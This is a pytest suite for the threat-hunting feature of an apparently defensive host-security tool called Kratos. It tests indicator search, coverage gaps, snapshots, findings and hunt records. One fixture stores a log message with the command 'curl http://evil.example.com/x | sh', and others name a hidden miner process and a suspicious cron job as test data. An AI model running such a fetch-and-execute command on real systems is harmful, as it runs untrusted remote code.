"""C.3: a hunt over what Kratos holds -- results, text search, coverage, records."""
from __future__ import annotations

import json
import time
from pathlib import Path

import pytest

from _untrusted_corpus import CORPUS, assert_screen_safe
from hunt_fixtures import event
from kratos import settings_store
from kratos.collect.sync import cursors
from kratos.events.store import EventStore
from kratos.hunt import report, store
from kratos.hunt import settings as S
from kratos.hunt.indicators import classify
from kratos.hunt.search import run_hunt

NOW = time.time()
DAY = 86400.0
SHA = "ef" * 32


@pytest.fixture
def events(tmp_path):
    return EventStore(tmp_path / "kratos.db")


def _hunt(tmp_path, text, kind=None, **kw):
    kw.setdefault("record", False)
    return run_hunt(tmp_path, [classify(text, kind)], **kw)


def test_hits_carry_machine_source_time_and_are_summarised_per_source(tmp_path, events):
    events.add([event(NOW - 3 * DAY + i * 60, n=i, source_ip="198.51.100.7", user_name="alice") for i in range(3)]
               + [event(NOW - DAY, n=9, dataset="kratos.firewall", source_ip="198.51.100.7")]
               + [event(NOW - DAY, n=10, target="db01", source_ip="203.0.113.5")])
    r = _hunt(tmp_path, "198.51.100.7")
    res = r.indicators[0]
    assert res.total_events == 4 and res.machines_hit() == ["web01"]
    by = {s.source: s for s in res.summaries}
    assert by["kratos.auth"].count == 3 and by["kratos.firewall"].count == 1
    assert by["kratos.auth"].first < by["kratos.auth"].last
    assert all(h.machine == "web01" and h.ts and h.dataset for h in res.hits)
    assert r.machines == ["db01", "web01"]           # every machine Kratos holds something about
    text = report.render(r)
    assert "FOUND on web01" in text and "not found on db01 -- in what Kratos holds" in text


def test_a_cidr_hunt_matches_the_network_only(tmp_path, events):
    events.add([event(NOW - 60, n=i, source_ip=ip) for i, ip in
                enumerate(("198.51.100.1", "198.51.100.254", "198.51.101.1", "2001:db8::5"))])
    assert _hunt(tmp_path, "198.51.100.0/24").indicators[0].total_events == 2
    assert _hunt(tmp_path, "2001:db8::/32").indicators[0].total_events == 1


def test_a_path_hunt_finds_what_is_inside_a_folder(tmp_path, events):
    events.add([event(NOW - 60, n=1, file_path="/tmp/.x/payload"), event(NOW - 60, n=2, file_path="/tmp/.xy"),
                event(NOW - 60, n=3, process_executable="/tmp/.x")])
    res = _hunt(tmp_path, "/tmp/.x").indicators[0]
    assert res.total_events == 2


def test_detections_are_counted_separately_with_the_rule_and_author(tmp_path, events):
    events.add([event(NOW - 60, n=1, dataset="kratos.detect", source_ip="198.51.100.7", rule_id="SIGMA-0A0B0C0D",
                      rule_name="Suspicious thing", rule_author=("Jane Doe",))])
    res = _hunt(tmp_path, "198.51.100.7").indicators[0]
    assert [s.source for s in res.summaries] == ["detections"]
    assert res.hits[0].rule == {"id": "SIGMA-0A0B0C0D", "name": "Suspicious thing", "author": "Jane Doe"}


def test_text_search_finds_what_is_only_in_the_message_and_escapes_like(tmp_path, events):
    events.add([event(NOW - 120, n=1, message="curl http://evil.example.com/x | sh"),
                event(NOW - 60, n=2, message="wrote /tmp/a_b%c today"),
                event(NOW - 30, n=3, message="wrote /tmp/aXbYc today")])
    res = _hunt(tmp_path, "evil.example.com").indicators[0]
    assert res.total_events == 1 and res.hits[0].via == "text"
    res = _hunt(tmp_path, "/tmp/a_b%c").indicators[0]
    assert res.total_events == 1 and "a_b%c" in res.hits[0].excerpt      # % and _ are literal, not wildcards
    # a longer address that starts with the one hunted is not a match
    events.add([event(NOW - 10, n=4, message="from 198.51.100.70 port 22")])
    assert _hunt(tmp_path, "198.51.100.7").indicators[0].total_events == 0


def test_the_time_limit_stops_the_text_scan_and_the_report_says_how_much(tmp_path, events, monkeypatch):
    events.add([event(NOW - h * 3600, n=h, message="noise") for h in range(1, 48)])
    from kratos.hunt import search as SE

    calls = {"n": 0}
    real = SE.time.monotonic

    def slow():                       # the clock moves an hour per look: the scan gets one slice
        calls["n"] += 1
        return real() + calls["n"] * 0.6
    monkeypatch.setattr(SE.time, "monotonic", slow)
    settings_store.set(S.SCAN_SECONDS, 1, data_dir=tmp_path, actor="test")
    r = _hunt(tmp_path, "nobody.example.com")
    scan = r.indicators[0].text_scans[0]
    assert scan.stopped_at is not None and scan.searched < scan.total == 47
    assert "the time limit stopped it" in report.render(r) and "older text was NOT searched" in report.render(r)


def test_huge_results_are_counts_with_a_hint(tmp_path, events):
    settings_store.set(S.MAX_HITS, 10, data_dir=tmp_path, actor="test")
    events.add([event(NOW - i, n=i, user_name="root") for i in range(25)])
    r = _hunt(tmp_path, "root", "account")
    res = r.indicators[0]
    assert res.too_many and res.total_events == 25 and len(res.hits) == 10
    text = report.render(r)
    assert "too many to list" in text and "Newest matching events" not in text


def test_machine_text_in_hits_is_cleaned(tmp_path, events):
    for i, payload in enumerate(CORPUS.values()):
        events.add([event(NOW - 60 - i, n=i, message=f"from 198.51.100.7 {payload}"[:4000], source_ip="198.51.100.7")])
    r = _hunt(tmp_path, "198.51.100.7")
    assert_screen_safe(report.render(r), where="hunt report")
    for h in r.as_dict()["results"][0]["hits"]:
        assert_screen_safe(json.dumps(h, ensure_ascii=False), where="hunt hit")


# ---------------------------------------------------------------------------- coverage
def test_never_synced_machine_is_not_searched(tmp_path, events):
    r = _hunt(tmp_path, "198.51.100.7", machines=["db01"])
    assert not r.coverage[0].holds_anything
    text = report.render(r)
    assert "NOT SEARCHED on db01: Kratos holds nothing from it" in text
    assert "not searched: Kratos holds nothing from db01" in text


def test_sync_spans_gaps_and_holes_appear(tmp_path, events):
    events.add([event(NOW - DAY, source_ip="203.0.113.5")])
    cursors.add_span(tmp_path, "web01", "auth", NOW - 10 * DAY, NOW - 6 * DAY, complete=True)
    cursors.add_span(tmp_path, "web01", "auth", NOW - 6 * DAY, NOW - 5 * DAY, complete=False,
                     note="journal entries were removed")
    cursors.add_span(tmp_path, "web01", "auth", NOW - 5 * DAY, NOW - 3 * DAY, complete=True)
    cursors.add_span(tmp_path, "web01", "auth", NOW - 2 * DAY, NOW - 60, complete=True)
    lines = _hunt(tmp_path, "198.51.100.7").coverage[0].lines()
    joined = "\n".join(lines)
    assert "auth log: every line held for" in joined
    assert "auth log: GAP" in joined and "journal entries were removed" in joined
    assert "auth log: not synced from" in joined          # the hole between day -3 and day -2


def test_a_window_clips_coverage(tmp_path, events):
    cursors.add_span(tmp_path, "web01", "auth", NOW - 10 * DAY, NOW - 60, complete=True)
    r = _hunt(tmp_path, "198.51.100.7", start=NOW - DAY)
    span = r.coverage[0].synced[0].spans[0]
    assert span[0] == pytest.approx(NOW - DAY)


def test_prune_is_stated_and_not_found_never_claims_before_it(tmp_path, events):
    from kratos import dataprune

    events.add([event(NOW - 40 * DAY, source_ip="198.51.100.7"), event(NOW - DAY, n=1, source_ip="203.0.113.5")])
    assert _hunt(tmp_path, "198.51.100.7").indicators[0].total_events == 1
    dataprune.apply_prune(tmp_path, dataprune.plan_prune(tmp_path, "host_events", 14), actor="alice via cli")
    r = _hunt(tmp_path, "198.51.100.7")
    assert r.indicators[0].total_events == 0
    text = report.render(r)
    assert "PRUNED: events before" in text and "nothing before then can be found" in text
    assert "not found on web01 -- in what Kratos holds" in text


def test_watch_records_and_link_down_appear(tmp_path, events, monkeypatch):
    from kratos.detect import live as L
    from kratos.lifecycle.decide import Actor
    from kratos.storage.subagent_store import SubAgentStore

    store_ = SubAgentStore(tmp_path / "kratos.db")
    code = store_.create_pairing_code(name="web01")
    tid = store_.redeem_pairing_code(code["code"], agent_id="a1", hostname="web01", agent_version="0.9.0")["target_id"]
    store_.record_link(tid, mode="tls-pinned", pin_version=1)
    store_.set_link("web01", tid, "subagent")
    L.set_watching(tmp_path, tid, True, actor=Actor(user="alice", interface="cli"))
    L.record_status(tmp_path, tid, {"sources": [
        {"name": "journal", "state": "watching", "since": NOW - 2 * DAY,
         "gaps": [{"id": 1, "from": NOW - DAY - 600, "to": NOW - DAY, "reason": "the watcher restarted"}]},
        {"name": "auditd", "state": "error", "since": NOW - 3600, "error": "auditd isn't running"}]})
    monkeypatch.setattr(L, "_connected", lambda *_a, **_k: (False, NOW - 3 * 3600))
    lines = "\n".join(_hunt(tmp_path, "198.51.100.7", machines=["web01"]).coverage[0].lines())
    assert "journal: watched live since" in lines and "only rule matches are stored" in lines
    assert "journal: not watched from" in lines and "the watcher restarted" in lines
    assert "auditd: NOT being watched now (error: auditd isn't running)" in lines
    assert "watching: the link to the agent has been down since" in lines


def test_events_read_outside_sync_are_partial(tmp_path, events):
    events.add([event(NOW - DAY, dataset="kratos.cron", user_name="bob")])
    lines = "\n".join(_hunt(tmp_path, "bob", "account").coverage[0].lines())
    assert "kratos.cron: 1 event(s) Kratos read between" in lines and "not every line" in lines


# ---------------------------------------------------------------------------- snapshots and findings
def _write(path: Path, doc: dict) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(json.dumps(doc), encoding="utf-8")


def test_snapshot_hunt_index_hash_program_and_remote_address(tmp_path):
    _write(tmp_path / "persistence" / "persistence_20261020_000000_000000.json", {
        "target": "web01", "checked_at_epoch": NOW - DAY, "signals": [],
        "hunt_index": {"files": [["/etc/cron.d/job", SHA]], "keys": [["bob", "SHA256:abc", "/home/bob/.ssh/k"]]}})
    _write(tmp_path / "live" / "live_response_20261020_000000_000000.json", {
        "target": "web01", "checked_at_epoch": NOW - DAY, "signals": [], "listeners": [],
        "hunt_index": {"processes": [["/tmp/.x/miner (deleted)", "miner", "www-data"]],
                       "remote_addrs": ["198.51.100.7"], "temp_files": []}})
    _write(tmp_path / "live" / "live_response_20261019_000000_000000.json", {      # another machine's read
        "target": "db01", "checked_at_epoch": NOW - DAY, "signals": [], "listeners": [],
        "hunt_index": {"processes": [], "remote_addrs": ["198.51.100.7"], "temp_files": []}})
    r = _hunt(tmp_path, SHA, machines=["web01"])
    assert [h.where for h in r.indicators[0].snapshot_hits] == [
        "file /etc/cron.d/job (no package owns it) had this hash"]
    assert r.indicators[0].found and "persistence read" in report.render(r)
    assert _hunt(tmp_path, "miner", "program", machines=["web01"]).indicators[0].snapshot_hits
    assert _hunt(tmp_path, "bob", "account", machines=["web01"]).indicators[0].snapshot_hits
    hits = _hunt(tmp_path, "198.51.100.0/24", machines=["web01", "db01"]).indicators[0].snapshot_hits
    assert sorted(h.machine for h in hits) == ["db01", "web01"]


def test_an_older_persistence_snapshot_matches_by_its_kept_prefix(tmp_path):
    _write(tmp_path / "persistence" / "persistence_20261020_000000_000000.json", {
        "target": "web01", "checked_at_epoch": NOW - DAY,
        "signals": [{"rule": "PERSIST-001", "entities": [f"/etc/cron.d/apache-update#{SHA[:12]}"],
                     "evidence": ["  /etc/cron.d/apache-update (cron jobs, added)"]}]})
    hit = _hunt(tmp_path, SHA, machines=["web01"]).indicators[0].snapshot_hits[0]
    assert hit.prefix_only and "/etc/cron.d/apache-update" in hit.where


def test_findings_entities_are_searched(tmp_path):
    from kratos.lifecycle import store as LS

    with LS.opened(tmp_path) as conn:
        conn.execute("INSERT INTO finding_records (finding_key, rule_id, target, subject, kind, state, severity, "
                     "title, entities, latest, first_seen, last_seen, times_seen) VALUES "
                     "('k1','CORR-SSH-001','web01','198.51.100.7','occurrence','open','high','Brute force',"
                     "'[\"198.51.100.7\"]','{}',?,?,1)", (NOW - DAY, NOW))
        conn.commit()
    res = _hunt(tmp_path, "198.51.100.0/24", machines=["web01"]).indicators[0]
    assert res.findings and res.findings[0]["rule"] == "CORR-SSH-001" and res.machines_hit() == ["web01"]


# ---------------------------------------------------------------------------- records
def test_each_hunt_is_recorded_and_prunable(tmp_path, events):
    from kratos import dataprune, datainv

    events.add([event(NOW - 60, source_ip="198.51.100.7")])
    r = run_hunt(tmp_path, [classify("198.51.100.7")], source="cli", actor="alice via cli")
    rows = store.recent(tmp_path)
    assert rows[0]["id"] == r.record_id and rows[0]["indicators"] == [{"kind": "ip", "value": "198.51.100.7",
                                                                      "label": "address"}]
    assert rows[0]["hits"] == 1 and rows[0]["machines"] == ["web01"] and "web01" in rows[0]["coverage"]
    assert any(c.key == "hunts" and c.personal == datainv.PERSONAL and c.prunable for c in datainv.CATEGORIES)
    plan = dataprune.plan_prune(tmp_path, "hunts", 1, now=NOW + 2 * DAY)
    assert plan.counts["hunt records"] == 1
    dataprune.apply_prune(tmp_path, plan, actor="alice via cli")
    assert store.recent(tmp_path) == []


def test_a_hunt_sends_nothing_anywhere(tmp_path, events, monkeypatch):
    import socket
    import subprocess

    def boom(*_a, **_k):
        raise AssertionError("a hunt must not reach the network or start a process")
    monkeypatch.setattr(socket, "create_connection", boom)
    monkeypatch.setattr(subprocess, "run", boom)
    monkeypatch.setattr(subprocess, "Popen", boom)
    events.add([event(NOW - 60, source_ip="198.51.100.7")])
    assert run_hunt(tmp_path, [classify("198.51.100.7"), classify("evil.example.com")], record=True).total_hits == 1
